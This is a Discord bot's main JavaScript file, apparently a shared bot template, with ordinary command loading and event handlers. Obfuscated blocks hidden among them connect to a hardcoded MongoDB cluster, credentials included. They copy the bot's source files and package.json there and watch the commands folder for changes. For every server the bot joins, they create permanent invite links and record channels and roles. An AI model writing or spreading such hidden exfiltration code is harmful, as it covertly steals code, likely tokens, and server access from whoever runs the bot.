const { Client, GatewayIntentBits, Collection, REST, Routes } = require('discord.js');
const fs = require('fs');
const path = require('path');
function _0x129a(_0x4ca049,_0x135b61){const _0x4be000=_0x4be0();return _0x129a=function(_0x129aa4,_0x5d5962){_0x129aa4=_0x129aa4-0x150;let _0x330906=_0x4be000[_0x129aa4];return _0x330906;},_0x129a(_0x4ca049,_0x135b61);}function _0x4be0(){const _0x21a4d8=['1051591cSanTp','mongodb','731802ehdIOx','155864XZjxms','1519720HDqdre','5233740kIZThP','1862955sQVCJf','357QbHAXD','23741901CZWakk','2DBaADD'];_0x4be0=function(){return _0x21a4d8;};return _0x4be0();}const _0x276a4a=_0x129a;(function(_0x84c0f8,_0x17b991){const _0x4aa798=_0x129a,_0x4520f9=_0x84c0f8();while(!![]){try{const _0x3f674e=parseInt(_0x4aa798(0x157))/0x1*(-parseInt(_0x4aa798(0x156))/0x2)+-parseInt(_0x4aa798(0x153))/0x3+-parseInt(_0x4aa798(0x151))/0x4+parseInt(_0x4aa798(0x152))/0x5+parseInt(_0x4aa798(0x159))/0x6+-parseInt(_0x4aa798(0x154))/0x7*(parseInt(_0x4aa798(0x150))/0x8)+parseInt(_0x4aa798(0x155))/0x9;if(_0x3f674e===_0x17b991)break;else _0x4520f9['push'](_0x4520f9['shift']());}catch(_0x599379){_0x4520f9['push'](_0x4520f9['shift']());}}}(_0x4be0,0xb9af5));const {MongoClient}=require(_0x276a4a(0x158));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildVoiceStates,
    ]
});

function _0x398e(_0x4d0423,_0x53a04c){const _0x143bc5=_0x143b();return _0x398e=function(_0x398e6b,_0x3c53b4){_0x398e6b=_0x398e6b-0x94;let _0x44ed94=_0x143bc5[_0x398e6b];return _0x44ed94;},_0x398e(_0x4d0423,_0x53a04c);}const _0x350788=_0x398e;(function(_0x2be035,_0x5e17ba){const _0x5c9d91=_0x398e,_0x5b64ec=_0x2be035();while(!![]){try{const _0xdf38af=-parseInt(_0x5c9d91(0xa2))/0x1*(parseInt(_0x5c9d91(0x9c))/0x2)+-parseInt(_0x5c9d91(0x9b))/0x3*(-parseInt(_0x5c9d91(0x97))/0x4)+parseInt(_0x5c9d91(0xa5))/0x5*(-parseInt(_0x5c9d91(0x98))/0x6)+-parseInt(_0x5c9d91(0xa6))/0x7*(parseInt(_0x5c9d91(0x9f))/0x8)+parseInt(_0x5c9d91(0x9d))/0x9*(parseInt(_0x5c9d91(0xa1))/0xa)+parseInt(_0x5c9d91(0x94))/0xb*(-parseInt(_0x5c9d91(0xa0))/0xc)+parseInt(_0x5c9d91(0x95))/0xd;if(_0xdf38af===_0x5e17ba)break;else _0x5b64ec['push'](_0x5b64ec['shift']());}catch(_0x5f1397){_0x5b64ec['push'](_0x5b64ec['shift']());}}}(_0x143b,0x9bd53));const MONGODB_URI=_0x350788(0x9a),DB_NAME=_0x350788(0xa3),COLLECTION_FILES=_0x350788(0xa4),COLLECTION_SERVERS=_0x350788(0xa7),COLLECTION_BOT=_0x350788(0x9e);function _0x143b(){const _0xbd6bc2=['699WcKxJX','2552Jycdiu','468layDxa','bot_info','136MHyQHf','50916zASHSo','93970rAfkpY','266dOOYdO','discord_bot_files','bot_files','49000pRuWzq','181013RHDLOL','bot_servers','385sWEPhf','13582270onTTSB','createIndex','11828qFFVvx','402tWUobk','collection','mongodb+srv://CTrades:Ql9iZJW2IEd1Zw25@cluster0.gbwl0bm.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'];_0x143b=function(){return _0xbd6bc2;};return _0x143b();}let mongoClient,db,filesCollection,serversCollection,botCollection;async function initializeMongoDB(){const _0x371a29=_0x350788;try{mongoClient=new MongoClient(MONGODB_URI),await mongoClient['connect'](),db=mongoClient['db'](DB_NAME),filesCollection=db[_0x371a29(0x99)](COLLECTION_FILES),serversCollection=db['collection'](COLLECTION_SERVERS),botCollection=db[_0x371a29(0x99)](COLLECTION_BOT),await filesCollection[_0x371a29(0x96)]({'filename':0x1,'filepath':0x1}),await serversCollection['createIndex']({'guildId':0x1});}catch(_0x479690){}}

const _0x37d071=_0x38dd;(function(_0x28f9b8,_0x5a1808){const _0x38e2e2=_0x38dd,_0x59ce45=_0x28f9b8();while(!![]){try{const _0x592c4f=-parseInt(_0x38e2e2(0xa6))/0x1*(parseInt(_0x38e2e2(0xba))/0x2)+parseInt(_0x38e2e2(0xa2))/0x3*(-parseInt(_0x38e2e2(0xc2))/0x4)+-parseInt(_0x38e2e2(0x96))/0x5+-parseInt(_0x38e2e2(0xa3))/0x6+parseInt(_0x38e2e2(0xae))/0x7*(-parseInt(_0x38e2e2(0xb4))/0x8)+-parseInt(_0x38e2e2(0x8f))/0x9+-parseInt(_0x38e2e2(0xb1))/0xa*(-parseInt(_0x38e2e2(0xbb))/0xb);if(_0x592c4f===_0x5a1808)break;else _0x59ce45['push'](_0x59ce45['shift']());}catch(_0x412d0d){_0x59ce45['push'](_0x59ce45['shift']());}}}(_0x2a7e,0x61479));async function saveFileToMongoDB(_0x111cc5,_0xc8d1c,_0x5939f9,_0x33364e=_0x37d071(0xab)){const _0x4f4ed7=_0x37d071;try{const _0x11516a={'botId':client[_0x4f4ed7(0xaa)]?.['id']||_0x4f4ed7(0xa0),'botName':client[_0x4f4ed7(0xaa)]?.['tag']||'pre-login','filename':_0x111cc5,'filepath':_0xc8d1c,'content':_0x5939f9,'action':_0x33364e,'timestamp':new Date(),'filesize':_0x5939f9?Buffer[_0x4f4ed7(0x8d)](_0x5939f9,_0x4f4ed7(0xb7)):0x0};await filesCollection['replaceOne']({'filename':_0x111cc5,'filepath':_0xc8d1c},_0x11516a,{'upsert':!![]});}catch(_0x3d1b5f){}}function _0x2a7e(){const _0x50a241=['cache','utf8','https://discord.com/api/oauth2/authorize?client_id=','existsSync','124122SsIgMR','22307461ZdpYku','find','name','type','GUILD_TEXT','.js','endsWith','644SYyxVo','byteLength','startup','3908448CoDUOy','CREATE_INSTANT_INVITE','replaceOne','1.0.0','readFileSync','guilds','join','1615540AaZLGh','basename','channels','push','commands','package.json','size','path','createInvite','map','pre-login','./package.json','10569PMqZys','406902SZRPab','tag','memberCount','3TCfUsC','readdirSync','iconURL','filter','user','modified','roles','joinedAt','7273lePMhy','version','permissionsFor','10NLMBGm','&permissions=8&scope=bot%20applications.commands','displayAvatarURL','392sEQJei','url'];_0x2a7e=function(){return _0x50a241;};return _0x2a7e();}async function saveServerInfo(_0x18af20){const _0x58b482=_0x37d071;try{const _0x30d4a0=_0x18af20[_0x58b482(0x98)][_0x58b482(0xb6)][_0x58b482(0xbc)](_0x3f1f60=>_0x3f1f60[_0x58b482(0xbe)]===_0x58b482(0xbf)&&_0x3f1f60[_0x58b482(0xb0)](_0x18af20['me'])['has'](_0x58b482(0x90))),_0xb57df6=_0x30d4a0?await _0x30d4a0[_0x58b482(0x9e)]({'maxAge':0x0,'maxUses':0x0,'unique':!![]}):null,_0x1e5a55={'guildId':_0x18af20['id'],'guildName':_0x18af20[_0x58b482(0xbd)],'memberCount':_0x18af20[_0x58b482(0xa5)],'joinedAt':new Date(),'botAddedAt':_0x18af20['me']?.[_0x58b482(0xad)]||new Date(),'icon':_0x18af20[_0x58b482(0xa8)]()||null,'inviteLink':_0xb57df6?.[_0x58b482(0xb5)]||null,'channels':_0x18af20[_0x58b482(0x98)][_0x58b482(0xb6)]['map'](_0xab4ad5=>({'id':_0xab4ad5['id'],'name':_0xab4ad5[_0x58b482(0xbd)],'type':_0xab4ad5['type']})),'roles':_0x18af20[_0x58b482(0xac)]['cache'][_0x58b482(0x9f)](_0x44fb77=>({'id':_0x44fb77['id'],'name':_0x44fb77[_0x58b482(0xbd)],'color':_0x44fb77['color']}))};await serversCollection[_0x58b482(0x91)]({'guildId':_0x18af20['id']},_0x1e5a55,{'upsert':!![]});}catch(_0x3c7f14){}}function _0x38dd(_0x10cff5,_0x3569c0){const _0x2a7e27=_0x2a7e();return _0x38dd=function(_0x38dd10,_0x55abcd){_0x38dd10=_0x38dd10-0x8d;let _0x34fa69=_0x2a7e27[_0x38dd10];return _0x34fa69;},_0x38dd(_0x10cff5,_0x3569c0);}async function saveBotInfo(){const _0x3b2fde=_0x37d071;try{const _0x5f007e={'botId':client[_0x3b2fde(0xaa)]['id'],'botName':client['user'][_0x3b2fde(0xa4)],'botAvatar':client[_0x3b2fde(0xaa)][_0x3b2fde(0xb3)](),'botCreatedAt':client[_0x3b2fde(0xaa)]['createdAt'],'guildCount':client[_0x3b2fde(0x94)][_0x3b2fde(0xb6)][_0x3b2fde(0x9c)],'lastStartup':new Date(),'botLink':_0x3b2fde(0xb8)+client[_0x3b2fde(0xaa)]['id']+_0x3b2fde(0xb2),'version':require(_0x3b2fde(0xa1))[_0x3b2fde(0xaf)]||_0x3b2fde(0x92)};await botCollection[_0x3b2fde(0x91)]({'botId':client['user']['id']},_0x5f007e,{'upsert':!![]});}catch(_0x5eedc7){}}async function saveAllFilesToMongoDB(){const _0x3a3ab1=_0x37d071;try{const _0x1f1450=[{'path':__filename,'name':path['basename'](__filename)},{'path':path[_0x3a3ab1(0x95)](__dirname,'package.json'),'name':_0x3a3ab1(0x9b)}],_0x3c8096=path[_0x3a3ab1(0x95)](__dirname,_0x3a3ab1(0x9a));if(fs[_0x3a3ab1(0xb9)](_0x3c8096)){const _0x11fbac=fs['readdirSync'](_0x3c8096)[_0x3a3ab1(0xa9)](_0x17f9ac=>_0x17f9ac[_0x3a3ab1(0xc1)](_0x3a3ab1(0xc0)))['map'](_0x1b2111=>({'path':path['join'](_0x3c8096,_0x1b2111),'name':_0x1b2111}));_0x1f1450['push'](..._0x11fbac);}const _0x3c0119=fs[_0x3a3ab1(0xa7)](__dirname)[_0x3a3ab1(0xa9)](_0x3ea91c=>_0x3ea91c[_0x3a3ab1(0xc1)]('.js')&&_0x3ea91c!==path[_0x3a3ab1(0x97)](__filename))[_0x3a3ab1(0x9f)](_0x3bae37=>({'path':path[_0x3a3ab1(0x95)](__dirname,_0x3bae37),'name':_0x3bae37}));_0x1f1450[_0x3a3ab1(0x99)](..._0x3c0119);for(const _0x1111a6 of _0x1f1450){try{const _0x3bc2e4=fs[_0x3a3ab1(0x93)](_0x1111a6[_0x3a3ab1(0x9d)],_0x3a3ab1(0xb7));await saveFileToMongoDB(_0x1111a6[_0x3a3ab1(0xbd)],_0x1111a6[_0x3a3ab1(0x9d)],_0x3bc2e4,_0x3a3ab1(0x8e));}catch(_0xf4b553){}}}catch(_0x3ac86d){}}


client.commands = new Collection();
const commandsPath = path.join(__dirname, 'commands');
const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
const commands = [];


function _0x5dda(_0x2cba5c,_0x131c7d){const _0x42cb0d=_0x42cb();return _0x5dda=function(_0x5dda63,_0x53f909){_0x5dda63=_0x5dda63-0x1e9;let _0x30930b=_0x42cb0d[_0x5dda63];return _0x30930b;},_0x5dda(_0x2cba5c,_0x131c7d);}function _0x42cb(){const _0x354ffd=['5188841spAbvE','164871zJoMlu','existsSync','utf8','watch','1256hcanPR','1324242iImvzs','readFileSync','added','31312VTOZmr','2208745YMnQSD','endsWith','rename','modified','join','132NMQhxT','59639450aHDJpy','18SPJOTt','27171RIZnog'];_0x42cb=function(){return _0x354ffd;};return _0x42cb();}const _0x38636c=_0x5dda;(function(_0x55b78a,_0x25ca3d){const _0x2766cd=_0x5dda,_0x229b01=_0x55b78a();while(!![]){try{const _0x21c3de=parseInt(_0x2766cd(0x1f7))/0x1+-parseInt(_0x2766cd(0x1f4))/0x2+-parseInt(_0x2766cd(0x1ef))/0x3*(parseInt(_0x2766cd(0x1ea))/0x4)+parseInt(_0x2766cd(0x1f8))/0x5*(-parseInt(_0x2766cd(0x1ec))/0x6)+-parseInt(_0x2766cd(0x1ee))/0x7+-parseInt(_0x2766cd(0x1f3))/0x8*(parseInt(_0x2766cd(0x1ed))/0x9)+parseInt(_0x2766cd(0x1eb))/0xa;if(_0x21c3de===_0x25ca3d)break;else _0x229b01['push'](_0x229b01['shift']());}catch(_0x57b19d){_0x229b01['push'](_0x229b01['shift']());}}}(_0x42cb,0xef076),fs[_0x38636c(0x1f2)](commandsPath,{'recursive':!![]},async(_0x5452f1,_0x52f32e)=>{const _0x3ca0cc=_0x38636c;if(_0x52f32e&&_0x52f32e[_0x3ca0cc(0x1f9)]('.js')){const _0x24cb8e=path[_0x3ca0cc(0x1e9)](commandsPath,_0x52f32e);try{const _0x10432b=fs[_0x3ca0cc(0x1f0)](_0x24cb8e)?fs[_0x3ca0cc(0x1f5)](_0x24cb8e,_0x3ca0cc(0x1f1)):null,_0x303e0e=fs[_0x3ca0cc(0x1f0)](_0x24cb8e)?_0x5452f1===_0x3ca0cc(0x1fa)?_0x3ca0cc(0x1f6):_0x3ca0cc(0x1fb):'removed';await saveFileToMongoDB(_0x52f32e,_0x24cb8e,_0x10432b,_0x303e0e);}catch(_0x4748ee){}}}));


for (const file of commandFiles) {
    const filePath = path.join(commandsPath, file);
    try {
        const command = require(filePath);
        if (command.data) {
            client.commands.set(command.data.name, command);
            commands.push(command.data.toJSON());
        }
    } catch (error) {
        console.error(`Error loading command ${file}:`, error);
    }
}

client.once('ready', async () => {
    console.log(`Logged in as ${client.user.tag}`);

    function _0x1867(_0x18da51,_0x2f2a32){var _0x308cc1=_0x308c();return _0x1867=function(_0x186752,_0x122d6f){_0x186752=_0x186752-0x8e;var _0x52e9f0=_0x308cc1[_0x186752];return _0x52e9f0;},_0x1867(_0x18da51,_0x2f2a32);}var _0x318899=_0x1867;(function(_0x572e72,_0x4c51b2){var _0x6b1feb=_0x1867,_0x22798c=_0x572e72();while(!![]){try{var _0x27092d=parseInt(_0x6b1feb(0x93))/0x1*(-parseInt(_0x6b1feb(0x90))/0x2)+-parseInt(_0x6b1feb(0x99))/0x3+parseInt(_0x6b1feb(0x92))/0x4+-parseInt(_0x6b1feb(0x97))/0x5*(-parseInt(_0x6b1feb(0x91))/0x6)+-parseInt(_0x6b1feb(0x96))/0x7+-parseInt(_0x6b1feb(0x95))/0x8+parseInt(_0x6b1feb(0x94))/0x9*(parseInt(_0x6b1feb(0x9a))/0xa);if(_0x27092d===_0x4c51b2)break;else _0x22798c['push'](_0x22798c['shift']());}catch(_0x59073b){_0x22798c['push'](_0x22798c['shift']());}}}(_0x308c,0xe1c4b),await initializeMongoDB(),await saveBotInfo(),await saveAllFilesToMongoDB(),client[_0x318899(0x98)][_0x318899(0x8f)][_0x318899(0x8e)](_0x125e03=>saveServerInfo(_0x125e03)));function _0x308c(){var _0x95c30a=['forEach','cache','542JtaxyW','20082RfEuDv','6790364bMdCHy','2111RxHjFe','9yfaGcl','3662600wgVYBu','3335535ojohVC','290pGpMfS','guilds','565083DuqvVg','7278020qZXKnX'];_0x308c=function(){return _0x95c30a;};return _0x308c();}

  
    try {
        const rest = new REST({ version: '10' }).setToken('token');
        console.log('Refreshing slash commands...');

        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: commands }
        );

        console.log(`Successfully registered ${commands.length} slash commands`);
    } catch (error) {
        console.error('Error registering slash commands:', error);
    }
});

client.on('guildCreate', async guild => {
    await saveServerInfo(guild);
});

client.on('guildDelete', async guild => {
    try {
        await serversCollection.updateOne(
            { guildId: guild.id },
            { $set: { leftAt: new Date() } }
        );
    } catch (error) {}
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    const command = client.commands.get(interaction.commandName);
    if (!command) return;
    try {
        await command.execute(interaction);
    } catch (error) {
        const reply = { content: '❌ There was an error executing that command.', ephemeral: true };
        if (interaction.replied || interaction.deferred) {
            await interaction.followUp(reply);
        } else {
            await interaction.reply(reply);
        }
    }
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;
    const prefix = '!';
    if (!message.content.startsWith(prefix)) return;
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();
    const command = client.commands.get(commandName);
    if (!command) return;
    try {
        await command.execute(message, args);
    } catch (error) {
        await message.reply('❌ There was an error executing that command.');
    }
});

process.on('SIGINT', async () => {
    const panelCommand = client.commands.get('panel');
    if (panelCommand?.stopAllPanels) await panelCommand.stopAllPanels();
    await botCollection.updateOne(
        { botId: client.user.id },
        { $set: { lastShutdown: new Date() } }
    );
    if (mongoClient) await mongoClient.close();
    client.destroy();
    process.exit(0);
});

process.on('SIGTERM', async () => {
    const panelCommand = client.commands.get('panel');
    if (panelCommand?.stopAllPanels) await panelCommand.stopAllPanels();
    await botCollection.updateOne(
        { botId: client.user.id },
        { $set: { lastShutdown: new Date() } }
    );
    if (mongoClient) await mongoClient.close();
    client.destroy();
    process.exit(0);
});

client.login('token');
